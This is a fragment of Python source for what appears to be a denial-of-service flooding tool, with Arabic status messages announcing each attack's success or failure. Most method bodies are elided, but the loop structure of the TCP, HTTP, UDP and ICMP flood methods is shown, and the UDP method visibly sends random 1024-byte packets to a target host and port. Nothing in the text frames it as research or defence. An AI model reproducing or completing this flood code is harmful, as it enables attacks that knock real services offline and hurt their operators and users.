...
def tcp_flood(self):
    while self.is_running:
        try:
            ...
            s.close()
            print("تم تنفيذ هجوم tcp_flood بنجاح.")
        except Exception as e:
            print(f"فشل في تنفيذ هجوم tcp_flood: {e}")
        time.sleep(0.1)
...
def http_flood(self):
    while self.is_running:
        try:
            ...
            print("تم تنفيذ هجوم http_flood بنجاح.")
        except Exception as e:
            print(f"فشل في تنفيذ هجوم http_flood: {e}")
        time.sleep(0.5)
...
def udp_flood(self):
    while self.is_running:
        try:
            ...
            s.sendto(random._urandom(1024), (self.target, self.port))
            s.close()
            print("تم تنفيذ هجوم udp_flood بنجاح.")
        except Exception as e:
            print(f"فشل في تنفيذ هجوم udp_flood: {e}")
        time.sleep(0.1)
...
def icmp_flood(self):
    while self.is_running:
        try:
            ...
            s.close()
            print("تم تنفيذ هجوم icmp_flood بنجاح.")
        except Exception as e:
            print(f"فشل في تنفيذ هجوم icmp_flood: {e}")
        time.sleep(0.1)
